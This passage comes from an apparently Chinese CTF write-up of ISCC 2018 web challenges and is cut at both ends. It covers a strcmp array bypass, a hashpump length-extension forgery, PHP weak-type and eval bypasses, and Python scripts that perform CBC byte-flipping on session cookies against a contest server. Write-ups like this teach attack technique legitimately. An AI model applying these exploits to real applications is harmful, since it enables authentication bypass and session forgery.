class="symbol">%201</span>=<span class="number">1</span><span class="symbol">%20</span>--+</span><br></pre></td></tr></table></figure><p><img src="/image/ISCC-2018/Web10.png" alt=""></p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">highlight_file(<span class="string">'2.php'</span>); </span></span><br><span class="line"><span class="php">$flag=<span class="string">'&#123;***************&#125;'</span>; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)   </span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);   </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>   </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;   </span></span><br><span class="line"><span class="php">&#125;   </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>想都不想，直接<code>/password[]=flag</code></p><h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>题目：那么长的秘钥，要爆破到什么时候啊</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span></span><br><span class="line"><span class="php">@$username=(string)$_POST[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">global</span> $key;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> md5($key.$text);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>($flag);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>);</span></span><br></pre></td></tr></table></figure><p>hash长度扩展攻击</p><ul><li><code>$key</code>变量我们是不知道的，但是从<code>len</code>值中能获取到长度为<code>46</code></li><li>从<code>verify</code>中得到<code>md5($key.guest)</code>的值为：<code>78cfc57d983b4a17e55828c001a3e781</code></li><li>成功登陆条件：<code>username=guestxxxxxxxxadmin</code>，并且<code>verify</code>要等于<code>md5($key.uaername)</code></li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s <span class="number">78</span>cfc<span class="number">57</span>d<span class="number">983</span>b<span class="number">4</span>a<span class="number">17e55828</span><span class="keyword">c</span><span class="number">001</span>a<span class="number">3e781</span> -d guest -k <span class="number">46</span> -a admin</span><br><span class="line">得出</span><br><span class="line"><span class="number">5</span>f<span class="number">585093</span>a<span class="number">7</span>fe<span class="number">86971766</span><span class="keyword">c</span><span class="number">3</span>d<span class="number">25</span><span class="keyword">c</span><span class="number">43</span>d<span class="number">0</span>eb</span><br><span class="line">guets\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">98</span>\<span class="keyword">x</span><span class="number">01</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>admin</span><br><span class="line">处理</span><br><span class="line">guest<span class="symbol">%80</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%98</span><span class="symbol">%01</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span>admin</span><br></pre></td></tr></table></figure><p>这个提交得看脸。</p><p>ISCC{MD5_1s_n0t_5afe}</p><h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>查看源码发现提示<code>index.txt</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'sqlwaf.php'</span>;</span></span><br><span class="line"><span class="php">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"................"</span>);</span></span><br><span class="line"><span class="php">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $iv=<span class="string">''</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span></span><br><span class="line"><span class="php">        $iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $iv;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $iv=get_random_iv();</span></span><br><span class="line"><span class="php">    $plain = serialize($info);</span></span><br><span class="line"><span class="php">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span></span><br><span class="line"><span class="php">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span></span><br><span class="line"><span class="php">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is *************&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span></span><br><span class="line"><span class="php">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span></span><br><span class="line"><span class="php">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span></span><br><span class="line"><span class="php">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">  $username=waf((string)$_POST[<span class="string">'username'</span>]);</span></span><br><span class="line"><span class="php">  $password=waf((string)$_POST[<span class="string">'password'</span>]);</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;You are not real admin!&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span></span><br><span class="line"><span class="php">        login($info);</span></span><br><span class="line"><span class="php">        show_homepage();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span></span><br><span class="line"><span class="php">        check_login();</span></span><br><span class="line"><span class="php">        show_homepage();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><a href="https://www.rawidn.com/posts/CBC-Byte-Flipping-Attack.html" target="_blank" rel="noopener">CBC字节反转攻击</a>攻击题目，先将输入的账号密码序列化，也就是获取<code>$plain</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = <span class="string">'Admin'</span>;</span><br><span class="line">$password = <span class="string">'RcoIl'</span>;</span><br><span class="line">$info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">$plain = serialize($info);</span><br><span class="line"><span class="keyword">echo</span> $plain;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">运算结果：</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">5</span>:<span class="string">"Admin"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">5</span>:<span class="string">"RcoIl"</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们的目的就是将<code>Admin</code>中的<code>A</code>转换成<code>a</code>，接下来就是把明文分成16个字节的块（因为<code>AES-128</code>以128位为一块,正好16字节）</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span>:<span class="number">2</span>:&#123;<span class="attribute">s</span>:<span class="number">8</span>:"userna</span><br><span class="line">me<span class="string">";s:5:"</span>Admin";</span><br><span class="line"><span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"password"</span>;<span class="selector-tag">s</span></span><br><span class="line"><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"RcoIl"</span>;&#125;</span><br></pre></td></tr></table></figure><p>我们目标字符位于块2，这意味这我们需要改变块1的密文来改变第二块的密文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#! -*- coding:utf-8 -*-</span></span><br><span class="line">__author__=<span class="string">'RcoIl'</span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.190.152.202:8001/'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'username'</span>: <span class="string">'Admin'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'12345'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cookie</span><span class="params">()</span>:</span> </span><br><span class="line">    s = requests.Session()</span><br><span class="line">    cookies = s.post(url,data=data).cookies</span><br><span class="line">    cipher = base64.b64decode(unquote(cookies[<span class="string">'cipher'</span>]))</span><br><span class="line">    cipher = cipher[:<span class="number">9</span>] +  chr(ord(cipher[<span class="number">9</span>]) ^ ord(<span class="string">'A'</span>) ^ ord(<span class="string">'a'</span>)) + cipher[<span class="number">10</span>:]</span><br><span class="line">    Cookie = <span class="string">"PHPSESSID="</span>+urllib.unquote(cookies[<span class="string">'PHPSESSID'</span>])+<span class="string">'; '</span>+<span class="string">"iv="</span> + urllib.unquote(cookies[<span class="string">'iv'</span>])+<span class="string">'; '</span>+<span class="string">"cipher="</span> + urllib.quote(base64.b64encode(cipher))</span><br><span class="line"></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">"Cookie"</span>: Cookie</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        request = requests.post(url , headers = header)     </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> request.text[<span class="number">18</span>:][:<span class="number">-24</span>]</span><br><span class="line">        <span class="keyword">print</span> Cookie</span><br><span class="line">            </span><br><span class="line">Cookie()   </span><br><span class="line">运行结果：</span><br><span class="line">C/<span class="number">6</span>oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9</span><br><span class="line">PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv=w8wkcnN//ERbrLkywW37hA==; cipher=<span class="number">7</span>dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%<span class="number">2</span>B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">查看unserialize的内容</span><br><span class="line">þ¨²¦ãÙ<span class="number">9</span>æpÒÄ¼Ume<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:5:"</span><span class="number">12345</span><span class="string">";&#125;,已成功改成admin</span></span><br></pre></td></tr></table></figure><p>但是第一块的内容显示不出来，接下来就是获取新的iv值及flag的获取。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"><span class="meta">#! -*- coding:utf-8 -*-</span></span><br><span class="line">__author__=<span class="string">'RcoIl'</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://118.190.152.202:8001/'</span></span><br><span class="line">iv = base64.b64decode(<span class="string">"w8wkcnN//ERbrLkywW37hA=="</span>)</span><br><span class="line">plain = base64.b64decode(<span class="string">"C/6oiLKm49k5g+Zw0sS8VW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9"</span>)</span><br><span class="line">want = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line"><span class="keyword">new</span><span class="type">iv</span> = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):<span class="type"></span></span><br><span class="line"><span class="type">    newiv </span>+= chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line">iv = urllib.quote(base64.b64encode(<span class="keyword">new</span><span class="type">iv</span>)) <span class="meta"># qQi%2BwLqqJaVYDSoxdtspsA%3D%3D</span></span><br><span class="line">cookie = <span class="string">"PHPSESSID=s3ikg88gets6adghmksalc2ld6; iv="</span>+ iv +<span class="string">"; cipher=7dpnbYnc5gErczAwWeSYjWwDq8NfL83hd%2B0ZqcZMrZ/TA2i7QVfndD6GNQV/wDhzOW0x3vij5aEuOsEwuCIzGg%3D%3D"</span></span><br><span class="line">header = &#123;</span><br><span class="line">        <span class="string">"Cookie"</span>: <span class="type">cookie</span></span><br><span class="line"><span class="type">    </span>&#125;</span><br><span class="line"><span class="keyword">try</span>:<span class="type"></span></span><br><span class="line"><span class="type">    request </span>= requests.post(url , headers = header)     </span><br><span class="line">except Exception as e:<span class="type"></span></span><br><span class="line"><span class="type">    print e</span></span><br><span class="line"><span class="type">else</span>:</span><br><span class="line">    print request.text</span><br></pre></td></tr></table></figure><p>替换提交即可登陆真正的<code>admin</code>用户。</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello admin<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>Flag is ISCC</span><span class="template-variable">&#123;123dasd89as10aas&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"loginout.php"</span>&gt;</span>Log out<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"md5.php"</span>  <span class="attr">method</span>=<span class="string">"post"</span> &gt;</span> </span><br><span class="line">    用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>/&gt;</span> </span><br><span class="line">    密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span> =<span class="string">"password"</span>/&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> &gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">header(<span class="string">"content-type:text/html;charset=utf-8"</span>); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123; </span></span><br><span class="line"><span class="php">    $username = $_POST[<span class="string">'username'</span>]; </span></span><br><span class="line"><span class="php">    $password = $_POST[<span class="string">'password'</span>]; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">    $username=<span class="string">"hello"</span>; </span></span><br><span class="line"><span class="php">    $password=<span class="string">"hello"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(md5($password) == <span class="number">0</span>)&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"xxxxx"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>看到第19行，明显的弱类型绕过。密码填写<code>240610708</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>; </span></span><br><span class="line"><span class="php">$a = @$_REQUEST[<span class="string">'a'</span>]; </span></span><br><span class="line"><span class="php">@<span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>); </span></span><br><span class="line"><span class="php">show_source(<span class="keyword">__FILE__</span>); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>绕过即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no_md5.php?<span class="attribute">a</span>=flag</span><br><span class="line">ISCC&#123;a39f9a1ff7eb4bab8a6a21b2ce111b4&#125;</span><br></pre></td></tr></table></figure><h3 id="Only-Admin"><a href="#Only-Admin" class="headerlink" title="Only Admin"></a>Only Admin</h3><p>题目：听说只有admin可以看到flag？</p><p>最开始以为是利用MySQL的超长截断特性进行注册登陆，发现没成功。</p><p>扫描目录，发现有一个<a href="https://pan.baidu.com/s/1w0TI7ghbq0pwtLAs8w60ig" target="_blank" rel="noopener">web.zip</a>文件。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">web</span></span><br><span class="line">├─ <span class="selector-class">.vscode</span></span><br><span class="line">│    └─ <span class="selector-tag">launch</span><span class="selector-class">.json</span></span><br><span class="line">├─ <span class="selector-tag">MessageController</span><span class="selector-class">.class</span><span class="selector-class">.php</span></span><br><span class="line">├─ <span class="selector-tag">UserController</span><span class="selector-class">.class</span><span class="selector-class">.php</span></span><br><span class="line">├─ <span class="selector-tag">config</span><span class="selector-class">.php</span>  # 配置文件</span><br><span class="line">├─ <span class="selector-tag">index</span><span class="selector-class">.php</span>  # 登陆后主页</span><br><span class="line">├─ <span class="selector-tag">login</span><span class="selector-class">.php</span>  # 登陆页面</span><br><span class="line">├─ <span class="selector-tag">reg</span><span class="selector-class">.php</span>  # 注册页面</span><br><span class="line">├─ <span class="selector-tag">send</span><span class="selector-class">.php</span></span><br><span class="line">└─ <span class="selector-tag">show</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure><p>审计，难受。 其实也就是带<code>cookie</code>访问的问题。</p><p>exp</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 